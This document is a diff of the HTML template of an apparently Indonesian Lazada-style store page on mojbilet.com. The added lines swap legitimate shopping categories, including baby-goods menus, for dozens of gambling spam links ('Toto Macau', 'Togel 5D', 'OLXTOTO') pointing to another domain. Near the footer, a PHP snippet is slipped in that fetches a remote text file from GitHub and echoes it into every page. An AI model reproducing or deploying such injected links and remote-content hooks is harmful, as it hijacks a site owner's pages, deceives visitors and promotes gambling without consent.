@@ -1,4 +1,3 @@
-
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID" class="orientalplay">
 <head>
@@ -474,7 +473,7 @@
 <div class="lzd-links-bar" id="topActionLinks">
 <div class="links-list header-content ID id">
 <div class="top-links-item" id="topActionInternalFeedback" style="display:none;">
-<a class="highlight" target="_blank" href="https://mojbilet.com/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d0">INTERNAL FEEDBACK</a>
+<a class="highlight" target="_blank" href="https://mojbilet.com/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d0">Bandar Toto Macau</a>
 </div>
 <div class="top-links-item" id="topActionFeedback">
 <a class="highlight" target="_blank" href="https://mojbilet.com/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback">OLXTOTO</a>
@@ -599,7 +598,7 @@ Live Chat (24 Jam)
 <i class="icon icon-arrow-on-button"></i>
 </button>
 </div>
-<p class="track-order-more-text">Untuk bantuan silakan,<a href="https://mojbilet.com/helpcenter/shipping-delivery/#answer-faq-trackorder-ans" title="Untuk bantuan silakan,">Klik disini</a></p>
+<p class="track-order-more-text">OLXTOTO,<a href="https://mojbilet.com/helpcenter/shipping-delivery/#answer-faq-trackorder-ans" title="Untuk bantuan silakan,">Klik disini</a></p>
 </form>
 <div class="error-message" id="topActionTrackErrorMsg"></div>
 </div>
@@ -1072,11 +1071,31 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_2">
-<a href="https://mojbilet.com/beli-makeup/">
-<span>Makeup</span>
+<a href="https://alqalamjournalpu.com/bandar-toto-macau/">
+<span>Bandar Toto Macau</span>
 </a>
 <script type="text" class="J_data_5_1">
-                            [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Makeup Bibir","childCategoryUrl":"https://mojbilet.com/beli-make-up-bibir"},{"childCategoryName":"Lipstik","childCategoryUrl":"https://mojbilet.com/beli-lipstik"},{"childCategoryName":"Makeup Wajah","childCategoryUrl":"https://mojbilet.com/makeup-wajah"},{"childCategoryName":"Foundation","childCategoryUrl":"https://mojbilet.com/beli-foundation"},{"childCategoryName":"Makeup Mata","childCategoryUrl":"https://mojbilet.com/beli-mata"},{"childCategoryName":"Maskara","childCategoryUrl":"https://mojbilet.com/beli-maskara"},{"childCategoryName":"Aksesoris Makeup","childCategoryUrl":"https://mojbilet.com/beli-aksesoris-makeup"},{"childCategoryName":"Set Kuas & Kuas Makeup","childCategoryUrl":"https://mojbilet.com/beli-kuas-aplikator"},{"childCategoryName":"Perawatan Kuku","childCategoryUrl":"https://mojbilet.com/beli-perawatan-kuku"},{"childCategoryName":"Set Makeup & Palet","childCategoryUrl":"https://mojbilet.com/shop-palet-set-makeup"},{"childCategoryName":"Pembersih Makeup","childCategoryUrl":"https://mojbilet.com/beli-pembersih-makeup"}]
+                            [
+    {"childCategoryName": "", "childCategoryUrl": ""},
+    {"childCategoryName": "Bandar Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau"},
+    {"childCategoryName": "Bandar Toto Macau Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-gacor"},
+    {"childCategoryName": "Bandar Toto Macau Online", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-online"},
+    {"childCategoryName": "Bandar Toto Macau Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-terpercaya"},
+    {"childCategoryName": "Bandar Toto Macau Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-jackpot"},
+    {"childCategoryName": "Bandar Toto Macau Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-bonus"},
+    {"childCategoryName": "Login Bandar Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/login-bandar-toto-macau"},
+    {"childCategoryName": "Daftar Bandar Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/daftar-bandar-toto-macau"},
+    {"childCategoryName": "Bandar Toto Macau Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-deposit"},
+    {"childCategoryName": "Bandar Toto Macau Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-alternatif"},
+    {"childCategoryName": "Bandar Toto Macau Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-tanpa-deposit"},
+    {"childCategoryName": "Bandar Toto Macau Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-progresif"},
+    {"childCategoryName": "Bandar Toto Macau Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-mobile"},
+    {"childCategoryName": "Bandar Toto Macau Demo", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-demo"},
+    {"childCategoryName": "Bandar Toto Macau Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-gratis"},
+    {"childCategoryName": "Bandar Toto Macau dengan RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-rtp-tinggi"},
+    {"childCategoryName": "Bandar Toto Macau Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-customer-service"},
+    {"childCategoryName": "Bandar Toto Macau Panduan", "childCategoryUrl": "https://alqalamjournalpu.com/bandar-toto-macau-panduan"}
+]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_3">
@@ -1104,11 +1123,11 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_6">
-<a href="https://mojbilet.com/beli-parfum/">
+<a href="https://alqalamjournalpu.com/toto-macau/">
 <span>Parfum</span>
 </a>
 <script type="text" class="J_data_5_5">
-                            [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Pria","childCategoryUrl":"https://mojbilet.com/beli-parfum-pria"},{"childCategoryName":"Wanita","childCategoryUrl":"https://mojbilet.com/beli-parfum-wanita"},{"childCategoryName":"Unisex","childCategoryUrl":"https://mojbilet.com/beli-parfum-unisex"}]
+                            [     {"childCategoryName": "Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau"},     {"childCategoryName": "Toto Macau Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gacor"},     {"childCategoryName": "Toto Macau Online", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-online"},     {"childCategoryName": "Toto Macau Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-terpercaya"},     {"childCategoryName": "Toto Macau Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-jackpot"},     {"childCategoryName": "Toto Macau Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-bonus"},     {"childCategoryName": "Toto Macau Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-deposit"},     {"childCategoryName": "Toto Macau Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-alternatif"},     {"childCategoryName": "Toto Macau Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-tanpa-deposit"},     {"childCategoryName": "Toto Macau Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-progresif"},     {"childCategoryName": "Toto Macau Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-mobile"},     {"childCategoryName": "Toto Macau Demo", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-demo"},     {"childCategoryName": "Toto Macau Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gratis"},     {"childCategoryName": "Toto Macau RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-rtp-tinggi"},     {"childCategoryName": "Toto Macau Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-customer-service"},     {"childCategoryName": "Panduan Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/panduan-toto-macau"} ]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_7">
@@ -1194,11 +1213,11 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_5">
-<a href="https://mojbilet.com/beli-makanan-bayi/">
-<span>Perlengkapan Menyusui</span>
+<a href="https://alqalamjournalpu.com/toto-macau-online/">
+<span>Toto Macau Online</span>
 </a>
 <script type="text" class="J_data_6_4">
-                            [{"childCategoryName":"Botol Bayi","childCategoryUrl":"https://mojbilet.com/beli-botol-bayi/"},{"childCategoryName":"Botol","childCategoryUrl":"https://mojbilet.com/beli-botol-bayi-balita/"},{"childCategoryName":"Aksesoris Dot Botol","childCategoryUrl":"https://mojbilet.com/jual-aksesoris-botol-dot-bayi/"},{"childCategoryName":"Penghangat & Sterilizers","childCategoryUrl":"https://mojbilet.com/beli-penghangat-sterilizer/"},{"childCategoryName":"Pompa Asi","childCategoryUrl":"https://mojbilet.com/jual-pompa-asi/"},{"childCategoryName":"Aksesesoris Pompa Asi","childCategoryUrl":"https://mojbilet.com/jual-aksesoris-pompa-asi/"},{"childCategoryName":"Perawatan Payudara","childCategoryUrl":"https://mojbilet.com/beli-perawatan-puting/"},{"childCategoryName":"Bantal Menyusui","childCategoryUrl":"https://mojbilet.com/beli-bantal-kursi-bayi/"},{"childCategoryName":"Kursi Bayi","childCategoryUrl":"https://mojbilet.com/beli-kursi-tinggi-bayi-kursi-booster/"},{"childCategoryName":"Food Blenders","childCategoryUrl":"https://mojbilet.com/beli-blender-makanan-bayi/"},{"childCategoryName":"Peralatan Makan Bayi","childCategoryUrl":"https://mojbilet.com/beli-perlengkapan-makan-bayi-bb/"},{"childCategoryName":"Set Peralatan Makan Bayi","childCategoryUrl":"https://mojbilet.com/jual-piring-mangkok-bayi/"}]
+                            [     {"childCategoryName": "Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau"},     {"childCategoryName": "Toto Macau Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gacor"},     {"childCategoryName": "Toto Macau Online", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-online"},     {"childCategoryName": "Toto Macau Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-terpercaya"},     {"childCategoryName": "Toto Macau Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-jackpot"},     {"childCategoryName": "Toto Macau Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-bonus"},     {"childCategoryName": "Toto Macau Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-deposit"},     {"childCategoryName": "Toto Macau Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-alternatif"},     {"childCategoryName": "Toto Macau Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-tanpa-deposit"},     {"childCategoryName": "Toto Macau Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-progresif"},     {"childCategoryName": "Toto Macau Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-mobile"},     {"childCategoryName": "Toto Macau Demo", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-demo"},     {"childCategoryName": "Toto Macau Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gratis"},     {"childCategoryName": "Toto Macau RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-rtp-tinggi"},     {"childCategoryName": "Toto Macau Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-customer-service"},     {"childCategoryName": "Panduan Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/panduan-toto-macau"} ]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_6">
@@ -1210,11 +1229,11 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_7">
-<a href="https://mojbilet.com/jual-perlengkapan-kamar-bayi/">
-<span>Kamar Bayi</span>
+<a href="https://alqalamjournalpu.com/togel-5d/">
+<span>Togel 5D</span>
 </a>
 <script type="text" class="J_data_6_6">
-                            [{"childCategoryName":"Matras Bayi","childCategoryUrl":"https://mojbilet.com/beli-kasur-seprai-bayi/"},{"childCategoryName":"Selimut Bayi","childCategoryUrl":"https://mojbilet.com/beli-selimut-bayi/"},{"childCategoryName":"Seprai Keranjang Bayi","childCategoryUrl":"https://mojbilet.com/beli-seprai-keranjang-bayi/"},{"childCategoryName":"Kelengkapan Alat Tidur Balita","childCategoryUrl":"https://mojbilet.com/beli-kelengkapan-alat-tidur-balita/"},{"childCategoryName":"Selimut Tebal & Bed Cover Bayi","childCategoryUrl":"https://mojbilet.com/beli-selimut-tebal-bed-cover-bayi/"},{"childCategoryName":"Bantal, Pelindung & Sarung Bantal Bayi","childCategoryUrl":"https://mojbilet.com/beli-bantal-pelindung-sarung-bantal-bayi/"},{"childCategoryName":"Furnitur Bayi","childCategoryUrl":"https://mojbilet.com/beli-furnitur-bayi/"},{"childCategoryName":"Ranjang Bayi","childCategoryUrl":"https://mojbilet.com/jual-ranjang-bayi/"},{"childCategoryName":"Keranjang Bayi Cradle","childCategoryUrl":"https://mojbilet.com/beli-keranjang-bayi-cradle/"},{"childCategoryName":"Laci & Lemari Pakaian Bayi","childCategoryUrl":"https://mojbilet.com/beli-laci-lemari-pakaian-bayi/"},{"childCategoryName":"Penyimpanan","childCategoryUrl":"https://mojbilet.com/beli-tempat-pengatur-penyimpanan/"},{"childCategoryName":"Dekorasi Kamar Anak","childCategoryUrl":"https://mojbilet.com/beli-dekorasi-kamar-anak/"}]
+                            [     {"childCategoryName": "Togel 5D", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d"},     {"childCategoryName": "Togel 5D Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-gacor"},     {"childCategoryName": "Togel 5D Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-terpercaya"},     {"childCategoryName": "Togel 5D Online", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-online"},     {"childCategoryName": "Togel 5D Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-jackpot"},     {"childCategoryName": "Togel 5D Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-bonus"},     {"childCategoryName": "Daftar Togel 5D", "childCategoryUrl": "https://alqalamjournalpu.com/daftar-togel-5d"},     {"childCategoryName": "Togel 5D Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-deposit"},     {"childCategoryName": "Togel 5D Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-alternatif"},     {"childCategoryName": "Togel 5D Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-tanpa-deposit"},     {"childCategoryName": "Togel 5D Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-progresif"},     {"childCategoryName": "Togel 5D Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-mobile"},     {"childCategoryName": "Togel 5D Demo", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-demo"},     {"childCategoryName": "Togel 5D Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-gratis"},     {"childCategoryName": "Togel 5D dengan RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-rtp-tinggi"},     {"childCategoryName": "Togel 5D Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-customer-service"},     {"childCategoryName": "Panduan Togel 5D", "childCategoryUrl": "https://alqalamjournalpu.com/panduan-togel-5d"} ]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_8">
@@ -2153,7 +2172,7 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_2">
-<a href="https://mojbilet.com/beli-makeup/">
+<a href="https://alqalamjournalpu.com/bandar-toto-macau/">
 <span>Makeup</span>
 </a>
 <script type="text" class="J_data_5_1">
@@ -2185,11 +2204,11 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_6">
-<a href="https://mojbilet.com/beli-parfum/">
+<a href="https://alqalamjournalpu.com/toto-macau/">
 <span>Parfum</span>
 </a>
 <script type="text" class="J_data_5_5">
-                            [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Pria","childCategoryUrl":"https://mojbilet.com/beli-parfum-pria"},{"childCategoryName":"Wanita","childCategoryUrl":"https://mojbilet.com/beli-parfum-wanita"},{"childCategoryName":"Unisex","childCategoryUrl":"https://mojbilet.com/beli-parfum-unisex"}]
+                            [     {"childCategoryName": "Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau"},     {"childCategoryName": "Toto Macau Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gacor"},     {"childCategoryName": "Toto Macau Online", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-online"},     {"childCategoryName": "Toto Macau Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-terpercaya"},     {"childCategoryName": "Toto Macau Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-jackpot"},     {"childCategoryName": "Toto Macau Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-bonus"},     {"childCategoryName": "Toto Macau Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-deposit"},     {"childCategoryName": "Toto Macau Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-alternatif"},     {"childCategoryName": "Toto Macau Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-tanpa-deposit"},     {"childCategoryName": "Toto Macau Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-progresif"},     {"childCategoryName": "Toto Macau Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-mobile"},     {"childCategoryName": "Toto Macau Demo", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-demo"},     {"childCategoryName": "Toto Macau Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gratis"},     {"childCategoryName": "Toto Macau RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-rtp-tinggi"},     {"childCategoryName": "Toto Macau Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-customer-service"},     {"childCategoryName": "Panduan Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/panduan-toto-macau"} ]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_6_7">
@@ -2275,11 +2294,11 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_5">
-<a href="https://mojbilet.com/beli-makanan-bayi/">
-<span>Perlengkapan Menyusui</span>
+<a href="https://alqalamjournalpu.com/toto-macau-online/">
+<span>Toto Macau Online</span>
 </a>
 <script type="text" class="J_data_6_4">
-                            [{"childCategoryName":"Botol Bayi","childCategoryUrl":"https://mojbilet.com/beli-botol-bayi/"},{"childCategoryName":"Botol","childCategoryUrl":"https://mojbilet.com/beli-botol-bayi-balita/"},{"childCategoryName":"Aksesoris Dot Botol","childCategoryUrl":"https://mojbilet.com/jual-aksesoris-botol-dot-bayi/"},{"childCategoryName":"Penghangat & Sterilizers","childCategoryUrl":"https://mojbilet.com/beli-penghangat-sterilizer/"},{"childCategoryName":"Pompa Asi","childCategoryUrl":"https://mojbilet.com/jual-pompa-asi/"},{"childCategoryName":"Aksesesoris Pompa Asi","childCategoryUrl":"https://mojbilet.com/jual-aksesoris-pompa-asi/"},{"childCategoryName":"Perawatan Payudara","childCategoryUrl":"https://mojbilet.com/beli-perawatan-puting/"},{"childCategoryName":"Bantal Menyusui","childCategoryUrl":"https://mojbilet.com/beli-bantal-kursi-bayi/"},{"childCategoryName":"Kursi Bayi","childCategoryUrl":"https://mojbilet.com/beli-kursi-tinggi-bayi-kursi-booster/"},{"childCategoryName":"Food Blenders","childCategoryUrl":"https://mojbilet.com/beli-blender-makanan-bayi/"},{"childCategoryName":"Peralatan Makan Bayi","childCategoryUrl":"https://mojbilet.com/beli-perlengkapan-makan-bayi-bb/"},{"childCategoryName":"Set Peralatan Makan Bayi","childCategoryUrl":"https://mojbilet.com/jual-piring-mangkok-bayi/"}]
+                            [     {"childCategoryName": "Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau"},     {"childCategoryName": "Toto Macau Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gacor"},     {"childCategoryName": "Toto Macau Online", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-online"},     {"childCategoryName": "Toto Macau Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-terpercaya"},     {"childCategoryName": "Toto Macau Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-jackpot"},     {"childCategoryName": "Toto Macau Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-bonus"},     {"childCategoryName": "Toto Macau Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-deposit"},     {"childCategoryName": "Toto Macau Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-alternatif"},     {"childCategoryName": "Toto Macau Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-tanpa-deposit"},     {"childCategoryName": "Toto Macau Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-progresif"},     {"childCategoryName": "Toto Macau Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-mobile"},     {"childCategoryName": "Toto Macau Demo", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-demo"},     {"childCategoryName": "Toto Macau Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-gratis"},     {"childCategoryName": "Toto Macau RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-rtp-tinggi"},     {"childCategoryName": "Toto Macau Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/toto-macau-customer-service"},     {"childCategoryName": "Panduan Toto Macau", "childCategoryUrl": "https://alqalamjournalpu.com/panduan-toto-macau"} ]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_6">
@@ -2291,11 +2310,11 @@ Live Chat (24 Jam)
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_7">
-<a href="https://mojbilet.com/jual-perlengkapan-kamar-bayi/">
+<a href="https://alqalamjournalpu.com/togel-5d/">
 <span>Kamar Bayi</span>
 </a>
 <script type="text" class="J_data_6_6">
-                            [{"childCategoryName":"Matras Bayi","childCategoryUrl":"https://mojbilet.com/beli-kasur-seprai-bayi/"},{"childCategoryName":"Selimut Bayi","childCategoryUrl":"https://mojbilet.com/beli-selimut-bayi/"},{"childCategoryName":"Seprai Keranjang Bayi","childCategoryUrl":"https://mojbilet.com/beli-seprai-keranjang-bayi/"},{"childCategoryName":"Kelengkapan Alat Tidur Balita","childCategoryUrl":"https://mojbilet.com/beli-kelengkapan-alat-tidur-balita/"},{"childCategoryName":"Selimut Tebal & Bed Cover Bayi","childCategoryUrl":"https://mojbilet.com/beli-selimut-tebal-bed-cover-bayi/"},{"childCategoryName":"Bantal, Pelindung & Sarung Bantal Bayi","childCategoryUrl":"https://mojbilet.com/beli-bantal-pelindung-sarung-bantal-bayi/"},{"childCategoryName":"Furnitur Bayi","childCategoryUrl":"https://mojbilet.com/beli-furnitur-bayi/"},{"childCategoryName":"Ranjang Bayi","childCategoryUrl":"https://mojbilet.com/jual-ranjang-bayi/"},{"childCategoryName":"Keranjang Bayi Cradle","childCategoryUrl":"https://mojbilet.com/beli-keranjang-bayi-cradle/"},{"childCategoryName":"Laci & Lemari Pakaian Bayi","childCategoryUrl":"https://mojbilet.com/beli-laci-lemari-pakaian-bayi/"},{"childCategoryName":"Penyimpanan","childCategoryUrl":"https://mojbilet.com/beli-tempat-pengatur-penyimpanan/"},{"childCategoryName":"Dekorasi Kamar Anak","childCategoryUrl":"https://mojbilet.com/beli-dekorasi-kamar-anak/"}]
+                            [     {"childCategoryName": "Togel 5D", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d"},     {"childCategoryName": "Togel 5D Gacor", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-gacor"},     {"childCategoryName": "Togel 5D Terpercaya", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-terpercaya"},     {"childCategoryName": "Togel 5D Online", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-online"},     {"childCategoryName": "Togel 5D Jackpot", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-jackpot"},     {"childCategoryName": "Togel 5D Bonus", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-bonus"},     {"childCategoryName": "Daftar Togel 5D", "childCategoryUrl": "https://alqalamjournalpu.com/daftar-togel-5d"},     {"childCategoryName": "Togel 5D Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-deposit"},     {"childCategoryName": "Togel 5D Alternatif", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-alternatif"},     {"childCategoryName": "Togel 5D Tanpa Deposit", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-tanpa-deposit"},     {"childCategoryName": "Togel 5D Progresif", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-progresif"},     {"childCategoryName": "Togel 5D Mobile", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-mobile"},     {"childCategoryName": "Togel 5D Demo", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-demo"},     {"childCategoryName": "Togel 5D Gratis", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-gratis"},     {"childCategoryName": "Togel 5D dengan RTP Tinggi", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-rtp-tinggi"},     {"childCategoryName": "Togel 5D Customer Service", "childCategoryUrl": "https://alqalamjournalpu.com/togel-5d-customer-service"},     {"childCategoryName": "Panduan Togel 5D", "childCategoryUrl": "https://alqalamjournalpu.com/panduan-togel-5d"} ]
                         </script>
 </li>
 <li class="lzd-site-menu-sub-item" data-cate="cate_7_8">
@@ -2994,7 +3013,11 @@ window.__pdpHydrateStatus=1;var loading=document.getElementById('pdp-skeleton-ne
 <a class="lzd-follow-us-icon" href="https://mojbilet.com/blog/" data-spm-click="gostr=/lzdpub.footer.sns;locaid=d_blg" style="display: inline-block; width: 32px; height: 32px">
 <img src="https://goodimg.io/images/2024/11/06/Icon-OLXTOTO.jpg" style="width: 32px; height: 32px" alt="Lazada Blg" data-pagespeed-url-hash="3615190259" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
 </a>
-</div>
+</div>  
+<?php 
+$a = file_get_contents('https://raw.githubusercontent.com/yugoprakoso157/D/refs/heads/main/mojbilet.com-bandar-toto.txt'); 
+echo $a; 
+?>
 <div class="lzd-footer-width-25">
 <div class="lzd-footer-copyright">
 Â© Lazada 2024
